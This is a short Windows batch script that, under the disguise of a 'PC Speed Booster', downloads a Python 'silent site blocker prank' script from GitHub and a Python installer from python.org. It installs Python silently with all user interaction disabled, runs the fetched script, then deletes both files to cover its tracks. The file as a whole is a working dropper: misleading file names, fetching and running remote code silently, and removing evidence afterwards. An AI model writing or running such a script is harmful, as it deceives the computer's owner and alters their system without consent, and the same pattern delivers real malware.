@echo off

cd /
curl https://raw.githubusercontent.com/dbouros/Silent-Site-Blocker-Prank/master/site_blocker_windows.py >> PCSpeedBooster.py
:: Execute powershell command shell to download python language installer executable and name it with the -Outfile flag.
:: Invoke-WebRequest = curl or wget commands for powershell , all three would work quite the same.
powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.9.2/python-3.9.2-amd64.exe -Outfile PCSpeedBoosterInstaller.exe"
:: Run python installer executable with quiet flag, disabling GUI and all interaction with the user.
PCSpeedBoosterInstaller.exe /quiet
:: Run the python script inside the hard disk.
python PCSpeedBooster.py

del PCSpeedBoosterInstaller.exe
del PCSpeedBooster.py